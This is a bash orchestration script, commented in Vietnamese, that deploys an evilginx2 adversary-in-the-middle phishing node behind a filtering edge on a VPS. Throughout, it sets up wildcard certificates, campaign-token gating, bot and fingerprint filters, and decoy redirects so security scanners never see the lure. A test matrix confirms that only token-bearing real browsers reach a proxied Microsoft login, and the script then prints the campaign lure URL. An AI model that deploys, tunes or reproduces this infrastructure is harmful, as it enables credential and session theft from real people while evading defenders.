#!/usr/bin/env bash
# deploy.sh — orchestrator: dựng node fake-evilginx-pro hoàn chỉnh chống-burn trên 1 VPS
#
# Kiến trúc: victim -> InfraGuard :443 (campaign_token + filters + decoy)
#              -> evilginx2 127.0.0.1:4443 (wildcard cert, botguard) -> origin
#
# Usage (trên VPS, từ thư mục deploy/ của repo đã clone):
#   BASE=auth2 ZONE=example.com VPS_IP=1.2.3.4 CF_TOKEN='...' ./deploy.sh all
#   ./deploy.sh ja4          # đo + allowlist JA4 của httpx (chạy sau infraguard)
#   ./deploy.sh verify       # test matrix
#
# Stages: deps | certs | evilginx | infraguard | ja4 | verify | all
set -euo pipefail

BASE="${BASE:?BASE=<label> required (vd: auth2)}"
ZONE="${ZONE:?ZONE=<registered domain> required}"
VPS_IP="${VPS_IP:?VPS_IP=<public ip> required}"
CF_TOKEN="${CF_TOKEN:-}"
EG_PORT="${EG_PORT:-4443}"
LANDING_SUB="${LANDING_SUB:-accounts}"

DEPLOY_DIR="$(cd "$(dirname "$0")" && pwd)"
STAGE="${1:-all}"
BASE_FQDN="${BASE}.${ZONE}"
LANDING_FQDN="${LANDING_SUB}.${BASE_FQDN}"

# CAMPAIGN_TOKEN bền vững qua các lần chạy: lưu ở runtime dir
TOKEN_FILE="$HOME/.evilginx/campaign-token"
if [ -z "${CAMPAIGN_TOKEN:-}" ]; then
  if [ -f "$TOKEN_FILE" ]; then CAMPAIGN_TOKEN="$(cat "$TOKEN_FILE")";
  else CAMPAIGN_TOKEN="$(openssl rand -hex 16)"; mkdir -p "$(dirname "$TOKEN_FILE")"; echo -n "$CAMPAIGN_TOKEN" > "$TOKEN_FILE"; fi
fi
export CAMPAIGN_TOKEN EG_PORT BASE ZONE VPS_IP LANDING_SUB

run_stage() {
  echo ""
  echo "#################### STAGE: $1 ####################"
  case "$1" in
    deps|certs|evilginx)
      "$DEPLOY_DIR/setup_evilginx.sh"
      ;;
    infraguard)
      "$DEPLOY_DIR/setup_infraguard.sh"
      ;;
    ja4)
      echo "JA4 allowlist trên evilginx KHÔNG áp dụng khi đứng sau InfraGuard:"
      echo "  - evilginx chỉ nghe 127.0.0.1 → mọi traffic cùng fingerprint httpx → allowlist vô nghĩa"
      echo "  - kẻ xấu không thể truy cập trực tiếp :${EG_PORT} để né InfraGuard"
      echo "  - lọc JA3/UA fingerprint THẬT của client nằm ở InfraGuard edge (pipeline.ja3/bot)"
      echo "=> evilginx chạy -botguard (UA heuristics + GREASE) không -bg-ja4. Hết stage."
      ;;
    verify)
      echo "--- Test matrix (từ chính VPS) ---"
      echo -n "1. LURE KHÔNG token (crawler) — kỳ vọng redirect 30x: "
      curl -sk --max-time 20 -o /dev/null -w "%{http_code} -> %{redirect_url}\n" \
        "https://127.0.0.1/${LURE_PATH:-EbUSnaiI}" -H "Host: ${LANDING_FQDN}" || echo FAIL
      echo -n "2. LURE CÓ token + UA curl — kỳ vọng 302 (bot filter chặn curl là ĐÚNG; browser thật + token mới thấy MS login): "
      curl -sk --max-time 30 -o /dev/null -w "%{http_code}\n" \
        "https://127.0.0.1/${LURE_PATH:-EbUSnaiI}?t=${CAMPAIGN_TOKEN}" -H "Host: ${LANDING_FQDN}" || echo FAIL
      echo -n "3. Host CDN (assets, không token) — kỳ vọng 200: "
      curl -sk --max-time 20 -o /dev/null -w "%{http_code}\n" \
        "https://127.0.0.1/" -H "Host: cdn-1.${BASE_FQDN}" || echo FAIL
      echo -n "4. Cert trên :443 — kỳ vọng CN=*.${BASE_FQDN}: "
      echo | openssl s_client -connect 127.0.0.1:443 -servername "${LANDING_FQDN}" 2>/dev/null | openssl x509 -noout -subject 2>/dev/null || echo FAIL
      echo -n "5. evilginx vẫn chặn scanner trực tiếp :${EG_PORT} — InfraGuard là cửa duy nhất: "
      sudo ss -tlnp | grep -q "127.0.0.1:${EG_PORT}" && echo "bind loopback OK" || echo "CHECK BIND!"
      echo ""
      echo "Lure URL cho campaign (cần DNS *.${BASE} trỏ ${VPS_IP}):"
      echo "  https://${LANDING_FQDN}/${LURE_PATH:-EbUSnaiI}?t=${CAMPAIGN_TOKEN}"
      ;;
    all)
      for s in deps certs evilginx infraguard ja4 verify; do run_stage "$s"; done
      ;;
    *) echo "Unknown stage: $1 (deps|certs|evilginx|infraguard|ja4|verify|all)"; exit 1;;
  esac
}

run_stage "$STAGE"
